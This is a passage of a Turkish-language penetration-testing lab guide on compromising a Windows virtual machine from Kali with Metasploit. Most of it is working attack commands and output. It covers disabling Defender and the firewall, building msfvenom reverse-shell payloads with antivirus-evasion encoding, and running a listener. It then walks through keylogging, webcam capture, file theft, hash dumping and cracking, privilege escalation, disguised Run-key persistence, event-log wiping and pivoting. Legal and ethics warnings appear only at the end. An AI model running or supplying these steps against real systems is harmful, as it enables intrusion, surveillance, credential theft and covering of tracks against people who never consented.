- Daha iyi ekran çözünürlüğü
- Fare entegrasyonu
- Drag & drop desteği

#### 2.4.5 Windows Defender Devre Dışı Bırakma

**UYARI:** Bu sadece test ortamı için! Gerçek sistemlerde güvenlik yazılımlarını kapatmayın.

**Adım 1: Real-time Protection Kapatma**
1. **Settings** → **Update & Security** → **Windows Security**
2. **Virus & threat protection**
3. **Manage settings**
4. **Real-time protection** → **Off**
5. **Cloud-delivered protection** → **Off**
6. **Automatic sample submission** → **Off**

**Adım 2: Windows Defender Tamamen Kapatma (Registry)**

⚠️ **Dikkat:** Registry düzenlemesi risklidir!

```powershell
# PowerShell'i Administrator olarak açın
# Win + X → "Windows PowerShell (Admin)"

# Windows Defender'ı tamamen devre dışı bırak
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

# Restart gerekli
Restart-Computer
```

**Adım 3: Firewall Kapatma (İsteğe Bağlı)**
```powershell
# PowerShell (Admin):
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Veya GUI'den:
# Control Panel → System and Security → Windows Defender Firewall
# "Turn Windows Defender Firewall on or off"
# Tüm network türleri için "Turn off"
```

#### 2.4.6 Windows Network Ayarları

**IP Adresini Kontrol Etme:**
```cmd
ipconfig
```

**Kali'ye Ping Testi:**
```cmd
REM Kali IP'sini öğrenin (Kali'de: ip addr show)
ping 192.168.100.X
```

**Shared Folder Kurulumu (Kali ↔ Windows):**

1. **VirtualBox'ta:**
   - VM kapalıyken → **Settings** → **Shared Folders**
   - Sağdaki **+** ikonuna tıkla
   - Folder Path: Kali'deki bir klasör (veya host klasör)
   - Folder Name: `shared`
   - **Auto-mount** ✓
   - **OK**

2. **Windows'ta Erişim:**
   ```
   Dosya Gezgini → Network → VBOXSVR → shared
   ```

---

### 2.5 Payload Oluşturma ve Test

#### 2.5.1 Kali Linux'ta Hazırlık

**Adım 1: IP Adresini Öğrenme**
```bash
# Kali'de terminaliniz
ip addr show

# veya
ifconfig

# Örnek çıktı:
# eth0: inet 192.168.100.5/24
# Bu senin LHOST'un!
```

**Adım 2: Çalışma Dizini Oluşturma**
```bash
# Ev dizininde bir klasör
cd ~
mkdir reverse_shell_lab
cd reverse_shell_lab
```

#### 2.5.2 MSFvenom ile Payload Üretimi

**Basit Windows Reverse Shell:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.100.5 \
  LPORT=4444 \
  -f exe \
  -o payload.exe
```

**Parametreler:**
- `LHOST`: Kali Linux IP adresi (kendi IP'nizi yazın!)
- `LPORT`: Dinleme portu (4444 standart, değiştirilebilir)
- `-f exe`: Windows executable formatı
- `-o payload.exe`: Çıktı dosya adı

**Üretim Çıktısı:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: payload.exe
```

**Encoded Payload (Antivirüs Bypass):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.100.5 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe \
  -o payload_encoded.exe
```

**64-bit Windows için:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.100.5 \
  LPORT=4444 \
  -f exe \
  -o payload_x64.exe
```

#### 2.5.3 Payload Transfer Yöntemleri

**Yöntem 1: Python HTTP Server (Önerilir)**

Kali'de:
```bash
# Payload'ın olduğu dizinde
cd ~/reverse_shell_lab
python3 -m http.server 8080

# Çıktı:
# Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Windows'ta:
```
1. Tarayıcıyı açın (Edge, Chrome)
2. Adres çubuğuna: http://192.168.100.5:8080
3. payload.exe dosyasına tıklayın
4. İndir ve masaüstüne kaydet
```

**Yöntem 2: Shared Folder**

1. VirtualBox Shared Folder'ı etkinleştirin (Daha önce anlattık)
2. Kali'de payload'ı shared folder'a kopyalayın:
   ```bash
   cp payload.exe /path/to/shared/
   ```
3. Windows'ta Network → VBOXSVR → shared'den eriş

**Yöntem 3: SCP (SSH Gerekli)**

Windows'ta OpenSSH Client kurulu olmalı:
```cmd
scp kali@192.168.100.5:/home/kali/reverse_shell_lab/payload.exe C:\Users\testuser\Desktop\
```

#### 2.5.4 Listener Başlatma (MSFconsole)

**Adım 1: MSFconsole Başlatma**
```bash
# Kali Linux terminalde
msfconsole

# Banner gelecek, bekleyin
```

**Adım 2: Handler Modülü Seçme**
```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) >
```

**Adım 3: Payload Ayarlama**
```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

**Adım 4: LHOST ve LPORT Ayarlama**
```bash
msf6 exploit(multi/handler) > set LHOST 192.168.100.5
LHOST => 192.168.100.5

msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
```

**Adım 5: Ayarları Kontrol Etme**
```bash
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique
   LHOST     192.168.100.5    yes       The listen address
   LPORT     4444             yes       The listen port
```

**Adım 6: Listener'ı Başlatma**
```bash
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.100.5:4444
```

Artık listener çalışıyor ve bekliyor! 🎯

#### 2.5.5 Windows'ta Payload Çalıştırma

**Adım 1: Payload Dosyasını Bul**
- Masaüstünde veya Downloads klasöründe `payload.exe`

**Adım 2: Windows Defender Uyarısını Bypass**
- Eğer Windows Defender açıksa, dosyayı sağ tık → "Scan with Microsoft Defender"
- "Allow on device" (veya Defender'ı kapat)

**Adım 3: Payload'ı Çalıştır**
- `payload.exe` dosyasına çift tıkla
- Bir terminal penceresi açılıp hızlıca kapanabilir (normal)

**Adım 4: Kali'de Bağlantıyı Gözle**

Kali'deki MSFconsole penceresinde:
```bash
[*] Started reverse TCP handler on 192.168.100.5:4444
[*] Sending stage (175686 bytes) to 192.168.100.10
[*] Meterpreter session 1 opened (192.168.100.5:4444 -> 192.168.100.10:49852)

meterpreter >
```

🎉 **Başarılı! Meterpreter shell'i aldınız!**

---

### 2.6 Post-Exploitation (Sistemden Sonra Ne Yapılır)

#### 2.6.1 Temel Bilgi Toplama

**Sistem Bilgisi:**
```bash
meterpreter > sysinfo
Computer        : WIN10-TARGET
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

**Kullanıcı Bilgisi:**
```bash
meterpreter > getuid
Server username: WIN10-TARGET\testuser
```

**İşlemler:**
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User
 ---   ----  ----               ----  -------  ----
 0     0     [System Process]
 4     0     System             x64   0
 404   4     smss.exe           x64   0
 ...
 5236  3104  payload.exe        x86   1        WIN10-TARGET\testuser
```

**Ağ Bilgisi:**
```bash
meterpreter > ipconfig

Interface 1
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:3d:9a:1c
MTU          : 1500
IPv4 Address : 192.168.100.10
IPv4 Netmask : 255.255.255.0
```

#### 2.6.2 Dosya Sistemi İşlemleri

**Dizin Gezinme:**
```bash
meterpreter > pwd
C:\Users\testuser\Desktop

meterpreter > ls
Listing: C:\Users\testuser\Desktop
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2024-02-08 10:30:45 +0300  desktop.ini
100777/rwxrwxrwx  73802 fil   2024-02-08 11:15:22 +0300  payload.exe

meterpreter > cd C:\\Users\\testuser\\Documents

meterpreter > cat example.txt
```

**Dosya İndirme:**
```bash
# Windows'tan Kali'ye
meterpreter > download C:\\Users\\testuser\\passwords.txt /home/kali/
[*] Downloading: C:\Users\testuser\passwords.txt -> /home/kali/passwords.txt
[*] Downloaded 1.23 KiB of 1.23 KiB (100.0%): C:\Users\testuser\passwords.txt -> /home/kali/passwords.txt
[*] download   : C:\Users\testuser\passwords.txt -> /home/kali/passwords.txt
```

**Dosya Yükleme:**
```bash
# Kali'den Windows'a
meterpreter > upload /home/kali/tools/nc.exe C:\\Users\\testuser\\Desktop\\
[*] uploading  : /home/kali/tools/nc.exe -> C:\Users\testuser\Desktop\
[*] Uploaded 59.00 KiB of 59.00 KiB (100.0%): /home/kali/tools/nc.exe -> C:\Users\testuser\Desktop\nc.exe
[*] uploaded   : /home/kali/tools/nc.exe -> C:\Users\testuser\Desktop\nc.exe
```

**Dosya Arama:**
```bash
meterpreter > search -f *.docx
Found 12 results...

    C:\Users\testuser\Documents\project.docx
    C:\Users\testuser\Documents\report.docx
    ...
```

#### 2.6.3 Ekran Görüntüsü ve Webcam

**Ekran Görüntüsü:**
```bash
meterpreter > screenshot
Screenshot saved to: /home/kali/.msf4/logs/scripts/screenshot/WIN10-TARGET_20240208.113045.jpeg
```

**Webcam Listesi:**
```bash
meterpreter > webcam_list
1: Integrated Camera
```

**Webcam Fotoğraf:**
```bash
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /home/kali/.msf4/logs/webcam/webcam_shot_2024-02-08_11-31-22.jpeg
```

#### 2.6.4 Keylogger

**Keylogger Başlatma:**
```bash
meterpreter > keyscan_start
Starting the keystroke sniffer...
```

**Yakalanan Tuşları Görüntüleme:**
```bash
# 30 saniye bekleyin, kullanıcı klavyede bir şeyler yazsın

meterpreter > keyscan_dump
Dumping captured keystrokes...
Hello this is a test<Return>
password123<Return>
```

**Keylogger Durdurma:**
```bash
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

#### 2.6.5 Privilege Escalation

**Mevcut Yetkileri Kontrol:**
```bash
meterpreter > getuid
Server username: WIN10-TARGET\testuser

meterpreter > getprivs
Enabled Process Privileges:
============================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

**SYSTEM Yetkisi Alma:**
```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Başarısız Olursa - Exploit Suggester:**
```bash
meterpreter > background
[*] Backgrounding session 1...

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.100.10 - Collecting local exploits for x86/windows...
[*] 192.168.100.10 - 38 exploit checks are being tried...
[+] 192.168.100.10 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 192.168.100.10 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
```

**Önerilen Exploit Kullanma:**
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_075_reflection
msf6 exploit(windows/local/ms16_075_reflection) > set SESSION 1
msf6 exploit(windows/local/ms16_075_reflection) > set LHOST 192.168.100.5
msf6 exploit(windows/local/ms16_075_reflection) > exploit

[*] Launching notepad to host the exploit...
[+] Process 2560 launched.
[*] Reflectively injecting the exploit DLL into 2560...
[*] Sending stage (176195 bytes) to 192.168.100.10
[*] Meterpreter session 2 opened (192.168.100.5:4444 -> 192.168.100.10:49865)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### 2.6.6 Hash Dumping

**Şifre Hash'lerini Çıkarma:**
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
testuser:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

**Hash Formatı:**
```
username:RID:LM_hash:NTLM_hash:::
```

**Hash'leri Kırma (John the Ripper):**
```bash
# Kali'de yeni bir terminal
echo "testuser:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::" > hashes.txt

john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# veya hashcat ile
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### 2.6.7 Persistence (Kalıcılık)

**Persistence Modülü:**
```bash
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.100.5
[*] Running Persistence Script
[*] Resource file for cleanup created at /home/kali/.msf4/logs/persistence/WIN10-TARGET_20240208.1143/WIN10-TARGET_20240208.1143.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4444
[*] Persistent agent script is 99656 bytes long
[+] Persistent Script written to C:\Users\testuser\AppData\Local\Temp\WaxKUOAg.vbs
[*] Executing script C:\Users\testuser\AppData\Local\Temp\WaxKUOAg.vbs
[+] Agent executed with PID 4892
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\pZQvdmCFGkrxw
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\pZQvdmCFGkrxw
```

**Registry Auto-Run (Manuel):**
```bash
meterpreter > upload /home/kali/reverse_shell_lab/payload.exe C:\\Windows\\Temp\\svchost.exe

meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v WindowsUpdate -d C:\\Windows\\Temp\\svchost.exe
```

#### 2.6.8 Process Migration

**Neden Process Migration?**
- Payload'ın stability'sini artırır
- Kullanıcı payload.exe'yi kapatırsa session düşmez
- Farklı yetki seviyelerine geçiş

**Migration:**
```bash
# Çalışan işlemleri listele
meterpreter > ps

# Hedef işlem (örn. explorer.exe - PID: 2460)
meterpreter > migrate 2460
[*] Migrating from 5236 to 2460...
[*] Migration completed successfully.

# Doğrulama
meterpreter > getpid
Current pid: 2460
```

#### 2.6.9 CMD Shell Erişimi

**Meterpreter'dan CMD Shell'e:**
```bash
meterpreter > shell
Process 4532 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.3693]
(c) Microsoft Corporation. All rights reserved.

C:\Users\testuser\Desktop>whoami
whoami
win10-target\testuser

C:\Users\testuser\Desktop>ipconfig
ipconfig
...

# Meterpreter'a dönmek için
C:\Users\testuser\Desktop>exit
exit
meterpreter >
```

---

### 2.7 Session Yönetimi

#### 2.7.1 Çoklu Session'lar

**Session'ları Listeleme:**
```bash
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x86/windows  WIN10-TARGET\testuser @ WIN... 192.168.100.5:4444 -> 192.168.100.10:49852
```

**Session'a Bağlanma:**
```bash
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

**Session'ı Arka Plana Alma:**
```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) >
```

**Session'ı Kapatma:**
```bash
msf6 exploit(multi/handler) > sessions -k 1
[*] Killing session 1

# Veya Meterpreter içinden
meterpreter > exit
```

#### 2.7.2 Session Komutları

```bash
sessions -l              # Detaylı liste
sessions -i [id]         # Session'a interact
sessions -k [id]         # Session'ı kill et
sessions -K              # Tüm session'ları kill et
sessions -u [id]         # Standard shell'i Meterpreter'a upgrade et
sessions -s [script]     # Tüm session'larda script çalıştır
```

---

### 2.8 Troubleshooting (Sorun Giderme)

#### 2.8.1 Bağlantı Sorunları

**Problem: Session açılmıyor**

Kontrol Listesi:
```bash
# 1. Network bağlantısını kontrol et
# Kali'de:
ping 192.168.100.10

# Windows'ta:
ping 192.168.100.5

# 2. LHOST doğru mu?
# Kali'de:
ip addr show
# MSFconsole'da:
show options
# LHOST, Kali'nin IP'si olmalı!

# 3. Firewall kapalı mı?
# Windows'ta:
Get-NetFirewallProfile | Format-Table Name, Enabled

# 4. Payload doğru mu?
# MSFconsole'da:
show options
# Payload, msfvenom'da kullandığınla aynı olmalı

# 5. Port çakışması var mı?
# Kali'de:
sudo netstat -tlnp | grep 4444
```

**Problem: Session hemen düşüyor**

Çözüm:
```bash
# 1. AutoRunScript kullan
msf6 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate

# 2. Manuel migration
meterpreter > ps
meterpreter > migrate [stable_PID]
```

#### 2.8.2 Payload Tespit Ediliyor

**Antivirüs Tespit Ediyorsa:**

```bash
# 1. Daha fazla encoding
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.100.5 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 10 \
  -f exe \
  -o payload_heavy_encoded.exe

# 2. Farklı encoder
msfvenom ... -e cmd/powershell_base64 ...

# 3. Custom template
msfvenom ... -x /path/to/legitimate.exe -k ...

# 4. Veil Framework kullan (alternatif)
sudo apt install veil
veil
```

#### 2.8.3 Performance Sorunları

**VM Yavaşsa:**

1. **RAM Artır:**
   - VM Settings → System → Base Memory (4096 MB önerilir)

2. **CPU Artır:**
   - VM Settings → System → Processor (2-4 core)

3. **3D Acceleration:**
   - VM Settings → Display → Enable 3D Acceleration

4. **VT-x/AMD-V Enabled:**
   - BIOS'ta virtualization enabled olmalı

---

### 2.9 Güvenli Kapatma ve Temizlik

#### 2.9.1 Session Temizliği

**Tüm Session'ları Kapat:**
```bash
msf6 > sessions -K
[*] Killing all sessions...
```

**Meterpreter'dan Çık:**
```bash
meterpreter > exit
```

#### 2.9.2 Veritabanı Temizliği

```bash
msf6 > workspace -d PenTestLab
[*] Deleted workspace: PenTestLab

msf6 > hosts -d
[*] Deleted all hosts

msf6 > services -d
[*] Deleted all services
```

#### 2.9.3 Log Temizliği (İsteğe Bağlı)

**Kali'de:**
```bash
# MSF log dosyaları
rm -rf ~/.msf4/logs/*

# Payload'ları sil
rm ~/reverse_shell_lab/payload*.exe
```

**Windows'ta (Hedef Sistem):**
```bash
# Event Viewer logları temizle (Meterpreter'dan)
meterpreter > clearev
[*] Wiping 3214 records from Application...
[*] Wiping 1891 records from System...
[*] Wiping 5321 records from Security...
```

---

### 2.10 Alternatif Senaryolar ve İleri Seviye

#### 2.10.1 Farklı Payload Türleri

**PowerShell Reverse Shell:**
```bash
# Payload üretimi
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.100.5 \
  LPORT=4444 \
  -f psh \
  -o payload.ps1

# Windows'ta çalıştırma
powershell.exe -ExecutionPolicy Bypass -File payload.ps1
```

**DLL Injection:**
```bash
# DLL payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.100.5 \
  LPORT=4444 \
  -f dll \
  -o payload.dll

# rundll32 ile çalıştırma (Windows'ta)
rundll32.exe payload.dll,main
```

**HTA (HTML Application):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.100.5 \
  LPORT=4444 \
  -f hta-psh \
  -o payload.hta

# Windows'ta: payload.hta dosyasına çift tıkla
```

#### 2.10.2 Pivoting (Yan Hareket)

**Senaryo:** Hedef sistemden başka bir networkte bulunan sisteme erişim.

```bash
# Route ekleme
meterpreter > run autoroute -s 10.10.10.0/24

# SOCKS proxy başlatma
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > run -j

# Proxychains ile kullan
# /etc/proxychains.conf düzenle:
# socks4 127.0.0.1 1080

# Başka bir sistemi tara
proxychains nmap -sT -Pn 10.10.10.5
```

#### 2.10.3 Port Forwarding

```bash
# Uzak port'u locale forward et
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5

# Artık Kali'den RDP bağlantısı:
rdesktop 127.0.0.1:3389
```

---

## 🛡️ BÖLÜM 3: GÜVENLİK VE ETİK

### 3.1 Yasal Uyarılar

**⚠️ ÇOK ÖNEMLİ:**

1. **İzin Olmadan Saldırı Yasadışıdır**
   - Türk Ceza Kanunu - Madde 243/1: Bilişim sistemine yetkisiz erişim
   - Ceza: 1 yıldan 3 yıla kadar hapis

2. **Sadece Test Ortamlarında**
   - Kendi sanal makinelerinizde
   - İzin alınmış penetrasyon testlerinde
   - Eğitim platformlarında (HackTheBox, TryHackMe)

3. **Profesyonel Penetrasyon Testi**
   - Yazılı sözleşme gerekli
   - Kapsam belirleme (scope)
   - NDA (Non-Disclosure Agreement)
   - Zarar sorumluluk sigortası

### 3.2 Etik Hacking Prensipleri

1. **İzin Al**
2. **Kapsamda Kal**
3. **Zarar Verme**
4. **Gizliliği Koru**
5. **Raporla**
6. **İyileştir**

### 3.3 Öğrenme Kaynakları

**Ücretsiz Platformlar:**
- HackTheBox: https://www.hackthebox.eu
- TryHackMe: https://tryhackme.com
- PentesterLab: https://pentesterlab.com
- OverTheWire: https://overthewire.org

**Sertifikalar:**
- CEH (Certified Ethical Hacker)
- OSCP (Offensive Security Certified Professional)
- eJPT (eLearnSecurity Junior Penetration Tester)
- PNPT (Practical Network Penetration Tester)

---

## 📖 Kaynaklar ve Referanslar

### Resmi Dokümantasyon
- Metasploit Unleashed: https://www.metasploitunleashed.com
- Metasploit Documentation: https://docs.metasploit.com
- Kali Linux Documentation: https://www.kali.org/docs
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide

### Kitaplar
- "The Hacker Playbook 3" - Peter Kim
- "Penetration Testing" - Georgia Weidman
- "Metasploit: The Penetration Tester's Guide" - David Kennedy vd.
- "Black Hat Python" - Justin Seitz

### Video Eğitimleri
- YouTube: Null Byte, NetworkChuck, John Hammond
- Udemy: Ethical Hacking Courses
- Coursera: Cybersecurity Specializations

---

## 🤝 Katkıda Bulunma

Bu proje eğitim amaçlıdır. Geliştirmeler için pull request gönderebilirsiniz.

---

## 📝 Lisans

Bu proje MIT lisansı altındadır. Eğitim amaçlı kullanım için ücretsizdir.

---

## ⚖️ Sorumluluk Reddi

Bu rehber **sadece eğitim amaçlıdır**. Burada anlatılan teknikler, yalnızca yasal ve etik sınırlar içinde, kendi kontrol ettiğiniz sistemlerde veya yazılı izin alınmış ortamlarda kullanılmalıdır. Yazar ve katkıda bulunanlar, bu bilgilerin kötüye kullanımından sorumlu değildir.

**Unutmayın:** Büyük güç, büyük sorumluluk getirir. Bilgisayar güvenliği bilgisini dünyayı daha güvenli bir yer yapmak için kullanın.

---

**🔐 Güvenli Testler Dileriz!**

*Son Güncelleme: Şubat 2024*
